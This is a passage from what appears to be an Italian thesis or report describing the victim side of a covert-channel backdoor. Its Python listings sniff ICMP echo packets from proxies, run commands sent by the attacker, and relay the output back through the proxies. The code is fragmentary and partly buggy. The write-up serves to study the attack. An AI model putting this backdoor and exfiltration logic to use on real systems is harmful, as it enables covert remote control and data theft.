e si fermano lo sniffer e il timer [Code:\ref{script:vittima:waitConnFromProxy} line 40].
\vspace{2ex} \newline
Alla fine si avrà una lista contenente i proxy connessi alla vittima. 
successivamente uno di loro invierà il comando da eseguire e poi verranno usati per reindirizzare i dati (ricavati dla comando) all'attaccante.
%---------------------------------
\vspace{2ex}  
\begin{lstlisting}[
    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
    %
    ,emph={ip_dst}, emphstyle=\color{red} 
    ,emph={[2]icmp, icmp6, dst}, emphstyle={[2]\color{blue}} 
    ,literate={`}{{\texttt{\char96}}}1{"}{{\texttt{"}}}1 
] 
    if ip_dst.version==4:
        return f"icmp and icmp[0]==8 and dst {ip_dst.compressed}" 
    elif ip_dst.version==6:
        return f"icmp6 and icmp6[0]==128 and dst {ip_dst.compressed}" 
    else: print(f"Caso non contemplato: {ip_src.version}") 
\end{lstlisting}
\captionof{lstlisting}{Filtro per il filtraggio dei pacchetti}
\label{script:vittima:filter}
%---------------------------------
\vspace{2ex} 
\begin{lstlisting}[
    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
    %
    ,keywords={}
    ,keywordstyle=\color{blue}
    ,emph={get_filter_connection_from_function, done_waiting_timeout, callback_wait_conn_from_proxy}, emphstyle=\color{red} 
    ,emph={[2]event_enough_proxy, callback_function_timer, args, sniffer, enough_proxy_timer, interface}, emphstyle={[2]\color{blue}}  
    ,emph={[3]connected_proxy, ip_host, lock_connected_proxy, num_proxy, attack_function}, emphstyle={[3]\color{olive}} 
    ,emph={[4]reached_proxy_number, sniff_packet_w_callbak}, emphstyle={[4]\color{red}}  
    ,literate={:}{{\char58}}1 
] 
try: 
    event_enough_proxy=com.get_threading_Event() 
    interface=mymethods.default_iface() 
    filter=attacksingleton.get_filter_connection_from_function(
        "wait_icmpEcho_dst" 
        ,ip_dst=ip_host
    ) 
except Exception as e:
    print(f"wait_conn_from_proxy filter: {e}") 
    return 
try:  
    args={
        "filter": filter 
        ,"prn":callback_wait_conn_from_proxy(
            connected_proxy
            ,ip_host
            ,event_enough_proxy
            ,lock_connected_proxy
            ,num_proxy
            ,attack_function
        ) 
        ,"iface":interface
    } 
    callback_function_timer = lambda: done_waiting_timeout(
        sniffer
        ,enough_proxy_timer
        ,event_enough_proxy
        ,lambda: reached_proxy_number(
            lock_connected_proxy
            ,connected_proxy
            ,num_proxy
        )
    )
    sniffer,enough_proxy_timer=com.sniff_packet_w_callbak(
        args,WAITING_TIME,callback_function_timer
    ) 
except Exception as e:
    print(f"wait_conn_from_proxy sniffing data: {e}",file=sys.stderr)  
try: 
    com.wait_threading_Event(event_enough_proxy)   
    com.stop_sinffer(sniffer) 
    com.stop_timer(enough_proxy_timer) 
except Exception as e:
    print(f"wait_conn_from_proxy closing connection: {e}",file=sys.stderr)
\end{lstlisting}
\captionof{lstlisting}{Waiting the connections from proxies}
\label{script:vittima:waitConnFromProxy}

\subsubsection*{Esecuzione del comando ed inoltro del risultato}
Stabilita la connessione con i proxy si aspeta che uno di loro inoltri il comando ricevuto dall'attaccante. 
Dopodichè, se il comando non indica la volonta di terminare la comunicazione, viene eseguito e 
il risultato viene inviato ai proxy [Code:\ref{script:vittima:commandExec}]. 
\vspace{1ex} \newline
Terminata la comunicazione il firewall viene riabilitato
\vspace{2ex} \newline 
\begin{lstlisting}[
    language=Python, basicstyle=\footnotesize, firstnumber=0, numbers=left, numberstyle=\tiny
    %
    ,keywords={}
    ,keywordstyle=\color{black}
    ,emph={wait_attacker_command, send_data_to_proxies, general_get_data_from_command, check_system_compatibility}, emphstyle=\color{red} 
    ,emph={[2]command, stdout_lines, stderr_lines}, emphstyle={[2]\color{blue}} 
    ,emph={[3]exit_cases, data, connected_proxy, attack_function, ip_host}, emphstyle={[3]\color{olive}} 
    ,literate={,}{{\char44}}1 
] 
    print(f"In attesa che l'attaccante invvii il comando") 
    wait_attacker_command(attack_function, ip_host, command) 
    if not check_system_compatibility(): 
        raise Exception(f"{sys.platform} non supportato...") 
    print("Sistema supportato...")  
    while command and command not in com.exit_cases:
        try:  
            print(f"Esecuzione del comando {command}") 
            stdout_lines, stderr_lines=general_get_data_from_command(command)
            print(f"Comando eseguito...")   
            if stderr_lines:
                print(f"stderr_lines got from execution: {stderr_lines}") 
                data=stderr_lines 
            elif stdout_lines: 
                print(f"stdout_lines got from execution: {stdout_lines}") 
                data=stdout_lines 
            else: 
                print(f"Caso non contemplato: {stdout_lines}\t{stderr_lines}") 
            send_data_to_proxies(data, connected_proxy, attack_function) 
            print("Waiting for another command from the attacker")   
            wait_attacker_command(attack_function, ip_host, command) 
        except Exception as e:
            print(f"wait_command_send_data: {e}")
    print("Fine del programma")
\end{lstlisting}
\captionof{lstlisting}{Command execution}
\label{script:vittima:commandExec}


